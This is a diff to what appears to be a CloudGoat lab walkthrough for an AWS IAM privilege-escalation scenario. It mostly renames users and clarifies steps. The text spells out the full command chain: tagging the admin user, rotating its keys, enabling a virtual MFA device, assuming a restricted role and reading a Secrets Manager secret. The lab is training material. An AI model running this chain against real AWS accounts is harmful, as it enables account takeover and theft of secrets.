@@ -8,16 +8,18 @@ export AWS_SECRET_ACCESS_KEY=RjW4jK6hMm....
 Enumerate the credentials
 
 ```bash
-aws iam list-user-policies --user-name devops_iam_privesc_by_key_rotation_<cloudgoat_id>
+aws iam list-user-policies --user-name manager_iam_privesc_by_key_rotation_<cloudgoat_id>
 # SelfManageAccess
 # TagResources
 
-aws iam get-user-policy --user-name devops_iam_privesc_by_key_rotation_<cloudgoat_id> --policy-name SelfManageAccess
+aws iam get-user-policy --user-name manager_iam_privesc_by_key_rotation_<cloudgoat_id> --policy-name SelfManageAccess
 
-aws iam get-user-policy --user-name devops_iam_privesc_by_key_rotation_<cloudgoat_id> --policy-name TagResources
+aws iam get-user-policy --user-name manager_iam_privesc_by_key_rotation_<cloudgoat_id> --policy-name TagResources
 ```
 
-With the permissions we can tag and change access keys for users with the tag
+With the permissions we can tag and change access keys for users with the tag `developer=true`.
+- Looking at the IAM users there is a developer and a admin user.
+- The admin user has permissions to assume a role `cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id>` which allows it to retrieve the secret flag.
 
 ```bash
 aws iam tag-user --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --tags '{"Key":"developer","Value":"true"}'
@@ -50,7 +52,7 @@ aws sts assume-role --role-arn arn:aws:iam::0123456789:role/cg_secretsmanager_ia
 
 ...the role can only be assumed when using multi-factor authentication
 
-Create a virtual mfa device
+Lets create a new virtual mfa device, back in the manager user shell/profile.
 
 ```bash
 aws iam create-virtual-mfa-device --virtual-mfa-device-name cloudgoat_virtual_mfa --outfile QRCode.png --bootstrap-method QRCodePNG
@@ -67,7 +69,7 @@ aws iam enable-mfa-device \
     --authentication-code2 615656
 ```
 
-Now we can assume the role since were using mfa
+Now we can assume the role since were using mfa. Switch back to the shell/profile that has the admin users credentials.
 
 ```bash
 aws sts assume-role --role-arn arn:aws:iam::0123456789:role/cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id> --role-session-name cloudgoat_secret --serial-number arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa --token-code 798934
@@ -85,7 +87,7 @@ aws sts assume-role --role-arn arn:aws:iam::0123456789:role/cg_secretsmanager_ia
 # }
 ```
 
-In a new shell retreive the secret
+In a new shell retrieve the secret
 
 ```bash
 export AWS_ACCESS_KEY_ID=ASIA....
@@ -94,6 +96,6 @@ export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjE..................
 
 aws secretsmanager list-secrets
 
-aws secretsmanager get-secret-value --secret-id cg_secret_iam_privesc_by_key_rotation_<cloudgoat_id>
-# Flag{...}
+aws secretsmanager get-secret-value --secret-id cg_secret_iam_privesc_by_key_rotation_<cloudgoat_id> | grep flag
+# flag{...}
 ```
